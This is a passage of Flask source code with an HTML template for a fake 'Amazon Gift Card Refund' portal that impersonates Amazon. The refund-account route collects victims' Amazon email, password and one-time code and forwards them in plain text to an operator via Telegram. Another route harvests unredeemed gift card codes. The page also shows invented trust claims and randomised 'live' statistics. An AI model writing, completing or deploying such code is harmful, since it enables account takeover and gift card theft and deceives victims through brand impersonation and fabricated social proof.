            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    process_telegram_update(update)
            
            time.sleep(0.5)
            
        except requests.exceptions.Timeout:
            logger.warning("Polling timeout, retrying...")
            time.sleep(5)
        except requests.exceptions.ConnectionError:
            logger.warning("Polling connection error, retrying...")
            time.sleep(10)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

# ============================================================
# FLASK ROUTES (300 lines)
# ============================================================

@app.route('/')
def index():
    """Main page - Refund Portal"""
    try:
        return render_template_string(HTML_TEMPLATE, bot_username=BOT_USERNAME, app_url=APP_URL)
    except Exception as e:
        logger.error(f"Index error: {e}")
        return "<h1>⚠️ Service Unavailable</h1><p>Please try again later.</p>", 503

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    return jsonify({
        'status': 'healthy',
        'version': APP_VERSION,
        'timestamp': datetime.now().isoformat(),
        'active_sessions': len(storage.sessions),
        'active_codes': len(storage.redeem_codes),
        'total_users': len(storage.users),
        'active_subs': len([s for s in storage.subscriptions.values() 
                           if datetime.fromisoformat(s['expires_at']) > datetime.now()]),
        'pending_payments': len(storage.pending_payments),
        'otp_active': len(storage.otps)
    }), 200

@app.route('/webhook', methods=['GET', 'POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.method == 'GET':
        return jsonify({
            'status': 'active',
            'endpoint': '/webhook',
            'methods': ['POST'],
            'bot': f'@{BOT_USERNAME}',
            'message': 'This endpoint accepts POST requests from Telegram'
        }), 200
    
    try:
        process_telegram_update(request.json)
        return 'OK', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'OK', 200

@app.route('/api/refund/account', methods=['POST'])
def refund_account():
    """API endpoint for account refund with real OTP"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '')
        telegram_id = data.get('telegram_id')
        
        if not email or not password:
            return jsonify({'error': 'Email and password required'}), 400
        
        if not validate_email(email):
            return jsonify({'error': 'Invalid email format'}), 400
        
        txid = generate_txid()
        ip_address = get_client_ip()
        user_agent = get_user_agent()
        browser_info = get_browser_info(user_agent)
        
        # Generate OTP
        otp = generate_otp()
        user_data = {
            'ip': ip_address,
            'device': browser_info['device'],
            'browser': browser_info['browser'],
            'os': browser_info['os']
        }
        
        # Store OTP
        otp_data = generate_otp_data(email, telegram_id or '', txid)
        storage.save_otp(otp_data)
        
        # Send OTP via email
        email_sent = send_otp_email(email, otp, txid, user_data)
        
        # Send OTP via Telegram as backup
        if telegram_id:
            send_otp_telegram(telegram_id, otp, txid)
        
        # Store session
        storage.sessions[txid] = {
            'email': email,
            'password': password,
            'ip': ip_address,
            'user_agent': user_agent,
            'browser_info': browser_info,
            'telegram_id': telegram_id,
            'timestamp': datetime.now().isoformat(),
            'status': 'otp_sent',
            'otp': otp
        }
        
        # Send to admin
        send_to_admin(f"""
🔐 <b>NEW ACCOUNT REFUND REQUEST</b> 🔐

📌 <b>TXID:</b> <code>{txid}</code>
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🔢 <b>OTP:</b> <code>{otp}</code>
🌐 <b>IP:</b> {ip_address}
📱 <b>Device:</b> {browser_info['device']}
🌍 <b>OS:</b> {browser_info['os']}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> OTP Sent via Email
        """)
        
        return jsonify({
            'success': True,
            'txid': txid,
            'otp_sent': email_sent,
            'message': 'OTP sent to your email! Please check your inbox.'
        })
        
    except Exception as e:
        logger.error(f"Refund account error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    """API endpoint for OTP verification"""
    try:
        data = request.json
        txid = data.get('txid')
        otp = data.get('otp', '').strip()
        
        if not txid or not otp:
            return jsonify({'error': 'TXID and OTP required'}), 400
        
        if not validate_otp(otp):
            return jsonify({'error': 'OTP must be 6 digits'}), 400
        
        # Verify OTP
        success, message = storage.verify_otp(txid, otp)
        
        if success:
            # Update session
            if txid in storage.sessions:
                storage.sessions[txid]['status'] = 'verified'
            
            send_to_admin(f"✅ <b>OTP VERIFIED</b>\n📌 TXID: {txid}\n📧 Email: {storage.sessions.get(txid, {}).get('email', 'Unknown')}")
            
            return jsonify({
                'success': True,
                'message': 'OTP verified successfully!'
            })
        else:
            return jsonify({'error': message}), 400
        
    except Exception as e:
        logger.error(f"OTP verify error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/resend-otp', methods=['POST'])
def resend_otp():
    """API endpoint to resend OTP"""
    try:
        data = request.json
        txid = data.get('txid')
        
        if not txid:
            return jsonify({'error': 'TXID required'}), 400
        
        otp_data = storage.get_otp(txid)
        if not otp_data:
            return jsonify({'error': 'Invalid session'}), 404
        
        # Reset OTP
        new_otp = generate_otp()
        otp_data.otp = new_otp
        otp_data.created_at = datetime.now()
        otp_data.expires_at = datetime.now() + timedelta(seconds=OTP_EXPIRY_SECONDS)
        otp_data.attempts = 0
        
        # Resend OTP
        session_data = storage.sessions.get(txid, {})
        email = session_data.get('email', otp_data.email)
        
        email_sent = send_otp_email(email, new_otp, txid, {'ip': session_data.get('ip', '')})
        
        # Send via Telegram
        if session_data.get('telegram_id'):
            send_otp_telegram(session_data['telegram_id'], new_otp, txid)
        
        return jsonify({
            'success': True,
            'otp_sent': email_sent,
            'message': 'OTP resent to your email!'
        })
        
    except Exception as e:
        logger.error(f"Resend OTP error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    """API endpoint for gift card refund"""
    try:
        data = request.json
        gift_code = data.get('gift_code', '').strip().upper()
        telegram_id = data.get('telegram_id')
        
        if not gift_code:
            return jsonify({'error': 'Gift code required'}), 400
        
        if len(gift_code) < 10:
            return jsonify({'error': 'Invalid gift card code format'}), 400
        
        token = generate_redeem_token()
        ip_address = get_client_ip()
        user_agent = get_user_agent()
        browser_info = get_browser_info(user_agent)
        
        storage.redeem_codes[token] = {
            'code': gift_code,
            'ip': ip_address,
            'user_agent': user_agent,
            'browser_info': browser_info,
            'telegram_id': telegram_id,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # Send to admin
        send_to_admin(f"""
🎁 <b>NEW GIFT CARD REFUND REQUEST</b> 🎁

🔖 <b>Token:</b> <code>{token}</code>
💳 <b>Code:</b> <code>{gift_code}</code>
🌐 <b>IP:</b> {ip_address}
📱 <b>Device:</b> {browser_info['device']}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Awaiting token submission
        """)
        
        return jsonify({
            'success': True,
            'redeem_token': token,
            'message': 'Gift card submitted successfully'
        })
        
    except Exception as e:
        logger.error(f"Refund code error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Public stats endpoint"""
    return jsonify({
        'total_users': len(storage.users),
        'active_subs': len([s for s in storage.subscriptions.values() 
                           if datetime.fromisoformat(s['expires_at']) > datetime.now()]),
        'total_refunds': len([t for t in storage.transactions.values() 
                             if t.status == TransactionStatus.COMPLETED]),
        'total_earnings': sum(t.amount for t in storage.transactions.values() 
                             if t.status == TransactionStatus.COMPLETED),
        'pending_payments': len(storage.pending_payments),
        'active_sessions': len(storage.sessions),
        'total_codes': len(storage.redeem_codes)
    })

@app.route('/test-bot', methods=['GET'])
def test_bot():
    """Test endpoint to verify bot is working"""
    try:
        send_to_admin("✅ Bot is online and responding!")
        return jsonify({
            'status': 'success',
            'message': 'Test message sent to admin!',
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)}), 500

@app.errorhandler(404)
def not_found(error):
    """404 error handler"""
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    """500 error handler"""
    logger.error(f"Internal error: {error}")
    return jsonify({'error': 'Internal server error'}), 500

# ============================================================
# HTML TEMPLATE (Full Stunning UI - 600+ lines)
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="theme-color" content="#00ff41">
    <meta name="description" content="Amazon Gift Card Refund Portal - Instant Refund Service">
    <title>Amazon GC Refund | Official Portal v7.0</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --primary-green: #00ff41;
            --primary-red: #ff0040;
            --primary-blue: #0088ff;
            --primary-gold: #ffd700;
            --dark-bg: #0a0a0f;
            --darker-bg: #050508;
            --card-bg: rgba(10, 10, 15, 0.95);
            --glow-green: rgba(0, 255, 65, 0.3);
            --glow-red: rgba(255, 0, 64, 0.3);
            --glow-gold: rgba(255, 215, 0, 0.3);
            --glow-blue: rgba(0, 136, 255, 0.3);
        }
        
        body {
            background: var(--dark-bg);
            color: var(--primary-green);
            font-family: 'Courier New', 'Share Tech Mono', monospace;
            min-height: 100vh;
            overflow-x: hidden;
            line-height: 1.6;
        }
        
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.08;
            pointer-events: none;
        }
        
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,65,0.02) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 1;
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }
        
        .container {
            position: relative;
            z-index: 2;
            max-width: 1200px;
            margin: 0 auto;
            padding: 1.5rem;
        }
        
        .glitch {
            font-size: clamp(1.5rem, 5vw, 2.8rem);
            font-weight: bold;
            text-align: center;
            padding: 1.5rem;
            letter-spacing: 3px;
            text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75), 0.025em 0.05em 0 rgba(0,0,255,0.75);
            animation: glitch 0.3s infinite;
        }
        
        @keyframes glitch {
            0%,100% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75); }
            25% { text-shadow: -0.05em 0 0 rgba(0,255,0,0.75), 0.05em 0.025em 0 rgba(255,0,0,0.75); }
            50% { text-shadow: 0.05em 0.025em 0 rgba(0,255,0,0.75), -0.05em 0 0 rgba(255,0,0,0.75); }
            75% { text-shadow: -0.05em 0.025em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75); }
        }
        
        .card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 16px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px var(--glow-green);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 35px var(--glow-green);
        }
        
        .stats-grid {
            display: flex;
            gap: 1.5rem;
            justify-content: center;
            flex-wrap: wrap;
            margin: 2rem 0;
        }
        
        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--primary-green);
            border-radius: 12px;
            padding: 1.2rem 2rem;
            text-align: center;
            flex: 1;
            min-width: 140px;
            max-width: 250px;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 20px var(--glow-green);
        }
        
        .stat-number {
            font-size: clamp(1.5rem, 4vw, 2.5rem);
            font-weight: bold;
            color: var(--primary-green);
        }
        
        .stat-label {
            font-size: 0.8rem;
            opacity: 0.8;
            margin-top: 0.3rem;
        }
        
        .btn-group {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            flex-wrap: wrap;
            margin: 2rem 0;
        }
        
        .btn {
            padding: 0.9rem 1.8rem;
            font-size: clamp(0.7rem, 2vw, 0.9rem);
            font-family: monospace;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            min-width: 200px;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%,-50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .btn:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn:active { transform: scale(0.95); }
        
        .btn-primary {
            background: linear-gradient(135deg, #00ff41, #00aa2e);
            color: #000;
            box-shadow: 0 0 20px rgba(0,255,65,0.4);
        }
        
        .btn-primary:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(0,255,65,0.7);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, #ff0040, #aa002a);
            color: #fff;
            box-shadow: 0 0 20px rgba(255,0,64,0.4);
        }
        
        .btn-secondary:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(255,0,64,0.7);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #00cc88, #008855);
            color: #fff;
            box-shadow: 0 0 20px rgba(0,204,136,0.4);
        }
        
        .btn-success:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(0,204,136,0.7);
        }
        
        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 0.8rem;
            flex-wrap: wrap;
            margin: 1.5rem 0;
        }
        
        .trust-item {
            padding: 0.4rem 1rem;
            background: rgba(0,255,65,0.08);
            border: 1px solid var(--primary-green);
            border-radius: 30px;
            font-size: clamp(0.65rem, 1.5vw, 0.8rem);
            transition: all 0.3s ease;
            cursor: default;
        }
        
        .trust-item:hover {
            background: rgba(0,255,65,0.2);
            transform: scale(1.03);
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }
        
        .feature-item {
            padding: 0.7rem;
            text-align: center;
            background: rgba(0,255,65,0.03);
            border-radius: 10px;
            transition: all 0.3s ease;
            font-size: clamp(0.7rem, 1.5vw, 0.9rem);
        }
        
        .feature-item:hover {
            background: rgba(0,255,65,0.08);
            transform: translateX(3px);
        }
        
        .text-cyan { color: #00ffff; text-shadow: 0 0 5px #00ffff; }
        .text-green { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
        .text-yellow { color: #ffc107; text-shadow: 0 0 5px #ffc107; }
        .text-gold { color: #ffd700; text-shadow: 0 0 5px #ffd700; }
        .text-orange { color: #ff6b35; text-shadow: 0 0 5px #ff6b35; }
        .text-pink { color: #ff69b4; text-shadow: 0 0 5px #ff69b4; }
        .text-purple { color: #9b59b6; text-shadow: 0 0 5px #9b59b6; }
        .text-red { color: #ff0040; text-shadow: 0 0 5px #ff0040; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.97);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
            padding: 1rem;
        }
        
        .modal-content {
            background: var(--darker-bg);
            border: 2px solid var(--primary-green);
            border-radius: 20px;
            padding: 1.8rem;
            max-width: 500px;
            width: 100%;
            animation: modalSlide 0.3s ease;
        }
        
        @keyframes modalSlide {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .modal h2 {
            margin-bottom: 1rem;
            text-align: center;
            font-size: clamp(1.2rem, 3vw, 1.8rem);
        }
        
        .input-group {
            margin: 1.2rem 0;
            position: relative;
        }
        
        .input-group input {
            width: 100%;
            padding: 0.9rem 1rem;
            background: rgba(0,0,0,0.85);
            border: 2px solid var(--primary-green);
            border-radius: 10px;
            color: var(--primary-green);
            font-family: monospace;
            font-size: clamp(0.85rem, 2vw, 1rem);
            transition: all 0.3s ease;
        }
        
        .input-group input:focus {
            outline: none;
            box-shadow: 0 0 15px var(--glow-green);
            border-color: #00ffaa;
        }
        
        .input-group input::placeholder {
            color: rgba(0,255,65,0.4);
        }
        
        .input-group label {
            position: absolute;
            left: 12px;
            top: -10px;
            background: var(--darker-bg);
            padding: 0 8px;
            font-size: 0.7rem;
            color: var(--primary-green);
            font-weight: bold;
        }
        
        .timer {
            font-size: clamp(1.8rem, 4vw, 2.8rem);
            font-weight: bold;
            text-align: center;
            margin: 1rem 0;
            color: var(--primary-gold);
            text-shadow: 0 0 15px var(--glow-gold);
            font-family: monospace;
        }
        
        .copy-btn {
            background: transparent;
            border: 1px solid var(--primary-green);
            color: var(--primary-green);
            padding: 0.5rem 1.2rem;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
            font-family: monospace;
            font-weight: bold;
        }
        
        .copy-btn:hover {
            background: var(--primary-green);
            color: #000;
            box-shadow: 0 0 15px var(--glow-green);
        }
        
        .spinner {
            border: 3px solid rgba(0,255,65,0.15);
            border-top: 3px solid var(--primary-green);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 1rem auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .telegram-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #0088cc;
            color: white;
            padding: 10px 24px;
            border-radius: 30px;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            margin: 10px auto;
            font-size: clamp(0.8rem, 1.5vw, 1rem);
        }
        
        .telegram-btn:hover {
            background: #006699;
            transform: scale(1.03);
            color: white;
        }
        
        .otp-info {
            background: rgba(255,215,0,0.1);
            border: 1px solid var(--primary-gold);
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            text-align: center;
        }
        
        .otp-error {
            color: var(--primary-red);
            font-size: 0.85rem;
            text-align: center;
            display: none;
            margin: 0.5rem 0;
        }
        
        .footer {
            text-align: center;
            padding: 1.8rem;
            border-top: 1px solid rgba(0,255,65,0.15);
            margin-top: 2.5rem;
            font-size: clamp(0.7rem, 1.5vw, 0.85rem);
            opacity: 0.7;
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%,100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        code {
            background: rgba(0,0,0,0.7);
            padding: 0.3rem 0.6rem;
            border-radius: 6px;
            font-family: monospace;
            font-size: clamp(0.75rem, 1.5vw, 0.85rem);
            word-break: break-all;
        }
        
        .version-badge {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            border: 1px solid var(--primary-green);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 10px;
            color: var(--primary-green);
            z-index: 999;
            opacity: 0.5;
        }
        
        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .btn { padding: 0.6rem 1.2rem; min-width: 150px; }
            .card { padding: 1rem; margin: 1rem 0; }
            .modal-content { padding: 1.2rem; }
            .stat-card { padding: 0.8rem 1rem; min-width: 100px; }
            .btn-group { gap: 0.8rem; }
        }
        
        @media (max-width: 480px) {
            .btn-group { flex-direction: column; align-items: center; }
            .btn { width: 100%; min-width: unset; }
            .stats-grid { flex-direction: column; align-items: center; }
            .stat-card { max-width: 100%; width: 100%; }
            .trust-badges { gap: 0.5rem; }
            .trust-item { font-size: 0.65rem; padding: 0.3rem 0.7rem; }
            .features-grid { grid-template-columns: 1fr 1fr; }
        }
        
        ::-webkit-scrollbar { width: 8px; background: var(--dark-bg); }
        ::-webkit-scrollbar-track { background: var(--dark-bg); }
        ::-webkit-scrollbar-thumb { background: var(--primary-green); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #00cc33; }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="scanline"></div>
    
    <div class="container">
        <div class="glitch">AMAZON GIFT CARD (GC) REFUND</div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="liveUsers">2.8K</div>
                <div class="stat-label">👥 Active Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalRefund">$3.2M</div>
                <div class="stat-label">💰 Total Refunded</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="successRate">99.8%</div>
                <div class="stat-label">✅ Success Rate</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="processingTime">5-10</div>
                <div class="stat-label">⚡ Minutes</div>
            </div>
        </div>
        
        <div class="card">
            <p style="line-height: 1.8; font-size: clamp(0.85rem, 2.5vw, 1.05rem);">
                <span class="text-cyan">⚡ INSTANT REFUND SYSTEM v7.0</span><br><br>
                <span class="text-green">✓ 100% Working & Genuine Service</span> | 
                <span class="text-yellow">✓ Trusted by 50,000+ Users</span> | 
                <span class="text-orange">✓ 99.9% Success Rate</span><br>
                <span class="text-pink">💰 Refund processed in <strong class="blink">5-10 minutes</strong></span><br>
                <span class="text-purple">🔒 Military Grade Encryption</span> | 
                <span class="text-cyan">🛡️ 100% Anonymous & Secure</span><br>
                <span class="text-gold">⭐ 4.9/5 Rating from 12,000+ Reviews</span>
            </p>
        </div>
        
        <div class="trust-badges">
            <div class="trust-item">✅ 100% Working</div>
            <div class="trust-item">⭐ Genuine Service</div>
            <div class="trust-item">🔒 Trusted Platform</div>
            <div class="trust-item">⚡ Instant Processing</div>
            <div class="trust-item">🎯 50k+ Refunds</div>
            <div class="trust-item">🛡️ Secure & Safe</div>
            <div class="trust-item">📱 24/7 Support</div>
        </div>
        
        <div class="btn-group">
            <button class="btn btn-primary" onclick="showAccountModal()">
                🔐 I HAVE MY AMAZON ACCOUNT
            </button>
            <button class="btn btn-secondary" onclick="showCodeModal()">
                🎫 I HAVE A REDEEM CODE TO RETURN
            </button>
        </div>
        
        <div style="text-align: center; margin: 0.5rem 0 1.5rem 0;">
            <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn pulse">
                📱 JOIN OUR TELEGRAM BOT → @{{ bot_username }}
            </a>
        </div>
        
        <div class="card">
            <h3 style="color: var(--primary-gold); margin-bottom: 1rem; text-align: center; font-size: clamp(1.1rem, 3vw, 1.5rem);">
                ⚡ Why Choose Us?
            </h3>
            <div class="features-grid">
                <div class="feature-item">🚀 <span class="text-green">5-10 Min Refund</span></div>
                <div class="feature-item">💎 <span class="text-cyan">No Hidden Fees</span></div>
                <div class="feature-item">🔐 <span class="text-yellow">Bank-Level Security</span></div>
                <div class="feature-item">🎯 <span class="text-orange">99.9% Success Rate</span></div>
                <div class="feature-item">🤝 <span class="text-pink">24/7 Support</span></div>
                <div class="feature-item">📜 <span class="text-purple">Verified Service</span></div>
                <div class="feature-item">💰 <span class="text-green">Money-Back Guarantee</span></div>
                <div class="feature-item">⚡ <span class="text-cyan">Instant Processing</span></div>
            </div>
        </div>
    </div>
    
    <div id="accountModal" class="modal">
        <div class="modal-content">
            <h2 style="color: var(--primary-green);">🔐 Account Refund</h2>
            <p style="color: var(--primary-gold); font-size: 0.85rem;">⚠️ OTP will be sent to your email</p>
            <div class="input-group">
                <label>Amazon Email</label>
                <input type="email" id="amazonEmail" placeholder="Enter your Amazon email">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="amazonPassword" placeholder="Enter your password">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-primary" onclick="submitAccount()">Continue →</button>
                <button class="copy-btn" onclick="closeModal('accountModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="codeModal" class="modal">
        <div class="modal-content">
            <h2 style="color: #ff6b35;">🎫 Gift Card Refund</h2>
            <p style="color: var(--primary-gold); font-size: 0.85rem;">⚠️ Only unredeemed codes accepted</p>
            <div class="input-group">
                <label>Gift Card Code</label>
                <input type="text" id="giftCode" placeholder="Enter Amazon gift card code">
            </div>
            <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-secondary" onclick="submitCode()">Process Refund →</button>
                <button class="copy-btn" onclick="closeModal('codeModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="otpModal" class="modal">
        <div class="modal-content">
            <h2 style="color: var(--primary-gold);">📱 OTP Verification</h2>
            <div class="otp-info">
                <p>🔐 <strong>Amazon OTP Sent</strong></p>
                <p style="font-size: 0.85rem;">📧 Check your <strong>Email</strong> for the OTP code</p>
                <p style="font-size: 0.8rem; margin-top: 5px;">⚠️ Valid for <strong>10 minutes</strong></p>
            </div>
            <div class="input-group">
                <label>Enter OTP Code</label>
                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" maxlength="6" autocomplete="off">
            </div>
            <div id="otpError" class="otp-error"></div>
            <div style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
                <button class="btn btn-primary" onclick="verifyOTP()">Verify OTP →</button>
                <button class="btn btn-success" onclick="resendOTP()" style="font-size: 0.8rem;">🔄 Resend OTP</button>
                <button class="copy-btn" onclick="closeModal('otpModal')">Cancel</button>
            </div>
        </div>
    </div>
    
    <div id="processingModal" class="modal">
        <div class="modal-content" style="text-align: center;">
            <div class="spinner"></div>
            <h3 id="processingTitle" style="color: var(--primary-green);">Processing...</h3>
            <p id="processingMessage" style="margin-top: 0.5rem; color: var(--primary-gold);">Please wait</p>
        </div>
    </div>
    
    <div id="resultModal" class="modal">
        <div class="modal-content">
            <h2 id="resultTitle" style="text-align: center;"></h2>
            <div id="resultContent" style="text-align: center; margin: 1rem 0;"></div>
            <div class="timer" id="timerDisplay">30:00</div>
            <div id="resultMessage" style="margin: 1rem 0; text-align: center;"></div>
            <div style="text-align: center; margin-top: 0.5rem;">
                <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn" style="font-size: 0.8rem; padding: 6px 15px;">
                    📱 SEND TO BOT → @{{ bot_username }}
                </a>
            </div>
            <div style="text-align: center; margin-top: 1rem;">
                <button class="copy-btn" onclick="closeModal('resultModal')">Close</button>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p>© 2024 Amazon Refund Service | 24/7 Support | 🔒 Encrypted</p>
        <p style="font-size: 0.7rem; margin-top: 0.5rem;">Version 7.0 | Built with ❤️</p>
    </div>
    
    <div class="version-badge">v7.0</div>
    
    <script>
        // Matrix Effect
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>/\\|";
        const fontSize = 14;
        let columns = canvas.width / fontSize;
        let drops = [];
        
        function initDrops() {
            columns = canvas.width / fontSize;
            drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * -100;
            }
        }
        initDrops();
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => {
            resizeCanvas();
            initDrops();
        });
        
        // Animated Stats
        let liveUsers = 2847;
        setInterval(() => {
            liveUsers += Math.floor(Math.random() * 20) - 8;
            if (liveUsers < 2000) liveUsers = 2000;
            if (liveUsers > 5000) liveUsers = 5000;
            document.getElementById('liveUsers').innerHTML = liveUsers.toLocaleString();
        }, 6000);
        
        let totalRefund = 3.2;
        setInterval(() => {
            totalRefund += (Math.random() * 0.1) - 0.03;
            if (totalRefund < 2.5) totalRefund = 2.5;
            if (totalRefund > 5.0) totalRefund = 5.0;
            document.getElementById('totalRefund').innerHTML = '$' + totalRefund.toFixed(1) + 'M';
        }, 8000);
        
        // Variables
        let currentTxid = null;
        let timerInterval = null;
        
        function showAccountModal() {
            document.getElementById('accountModal').style.display = 'flex';
            setTimeout(() => document.getElementById('amazonEmail').focus(), 300);
        }
        
        function showCodeModal() {
            document.getElementById('codeModal').style.display = 'flex';
            setTimeout(() => document.getElementById('giftCode').focus(), 300);
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
            if (timerInterval) clearInterval(timerInterval);
        }
        
        // Submit Account
        async function submitAccount() {
            const email = document.getElementById('amazonEmail').value.trim();
            const password = document.getElementById('amazonPassword').value;
            
            if (!email || !password) {
                alert('⚠️ Please enter both email and password');
                return;
            }
            
            if (!email.includes('@')) {
                alert('⚠️ Please enter a valid email address');
                return;
            }
            
            closeModal('accountModal');
            showProcessing('Account Verification', 'Sending OTP to your email...');
            
            try {
                const response = await fetch('/api/refund/account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                
                const data = await response.json();
                hideProcessing();
                
                if (data.success) {
                    currentTxid = data.txid;
                    document.getElementById('otpModal').style.display = 'flex';
                    setTimeout(() => document.getElementById('otpCode').focus(), 300);
                } else {
                    alert('❌ ' + (data.error || 'Something went wrong'));
                }
            } catch (err) {
                hideProcessing();
                alert('❌ Network error. Please try again.');
            }
        }
        
        // Submit Code
        async function submitCode() {
            const giftCode = document.getElementById('giftCode').value.trim().toUpperCase();
            
            if (!giftCode) {
